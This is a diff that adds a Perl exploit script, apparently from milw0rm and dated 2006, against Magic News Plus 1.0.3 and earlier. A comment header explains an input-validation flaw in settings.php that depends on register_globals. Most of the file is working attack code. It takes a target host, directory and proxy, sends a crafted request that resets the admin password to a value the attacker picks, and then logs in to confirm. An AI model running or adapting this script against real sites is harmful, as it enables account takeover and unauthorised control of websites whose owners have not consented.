@@ -1,0 +1,105 @@
+#!/usr/bin/perl
+#
+# Magic News Plus <=1.0.3 Admin Pass Change Exploit
+#
+# Copyright (c) 2006 cijfer <cijfer@netti.fi>
+# All rights reserved.
+#
+# An input validation flaw exists within 'settings.php'
+# of Magic News Plus which can lead to the changing of
+# the administrative password. Here is where the problem 
+# is (line 108 of 426):
+#
+#       ...
+# [1]   elseif ($action == "change")
+#	       ...
+# [2]	   if ($passwd != $admin_password)
+#		       ...
+# [3]		   if ($new_passwd != $confirm_passwd)
+#       ...
+#
+# 1. &action=change
+# 2. &passwd=<ANYTHING>&admin_password=<AGAIN>
+# 3. &new_passwd=<NEW>&confirm_passwd=<AGAIN>
+#
+# -> register_globals = on
+#
+# haha, sorry, no cmd execute this time.
+#
+# $Id: cijfer-mnxpl.pl,v 0.1 2006/01/07 19:24:00 cijfer Exp cijfer $
+
+use LWP::UserAgent;
+use Getopt::Long;
+use Term::ANSIColor;
+
+$port = 80;
+$new  = "cijfer";
+$res  = GetOptions("host=s" => \$host, "dir=s" => \$dir, "port=i" => \$port, "tunnel=s" => \$tunnel, "new=s" => \$new);
+
+&usage unless $host and $dir;
+&exploit;
+
+sub usage
+{
+	print "Magic News Plus <=1.0.3 Admin Pass Change Exploit\n";
+	print "Usage: $0 -hdn [OPTION]...\n\n";
+	print "  -h --host\thostname or ip of target\n";
+	print "  -d --dir\tdirectory without ending slash\n";
+	print "  -p --port\tport number (default: 80)\n";
+	print "  -t --tunnel\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
+	print "  -n --new\tnew admin password you want (default: cijfer)\n\n";
+	exit;
+}
+
+sub try
+{
+	$cij=LWP::UserAgent->new() or die;
+	$cij->agent("Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)");
+	$cij->proxy("http", "http://".$tunnel."/") unless !$tunnel;
+
+	$path="http://".$host.$dir."/";
+	$out=$cij->get($path."index.php?login=admin&password=".$new."&action=login");
+
+	if($out->is_success)
+	{
+		if($out->content =~ /Wrong/)
+		{
+			print color("red"), ":(\n", color("reset");
+			exit;
+		}
+	}
+}
+
+sub exploit
+{
+	$cij=LWP::UserAgent->new() or die;
+	$cij->agent("Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)");
+	$cij->proxy("http", "http://".$tunnel."/") unless !$tunnel;
+
+	$string  = "settings.php?action=change";
+	$string .= "&passwd=cijfer";
+	$string .= "&admin_password=cijfer";
+	$string .= "&new_passwd=";
+	$string .= $new;
+	$string .= "&confirm_passwd=";
+	$string .= $new;
+
+	$path="http://".$host.$dir."/";
+	$out=$cij->get($path.$string);
+
+	if($out->is_success)
+	{
+		print "trying username admin and password ".$new."...\n";
+		&try;
+		print "user: admin, pass: ".$new;
+		print color("green"), " :)) ", color("reset");
+		print "-- http://".$host.$dir."\n";
+	}
+	else
+	{
+		print color("red"), ":(\n", color("reset");
+		exit;
+	}
+}
+
+# milw0rm.com [2006-01-09]
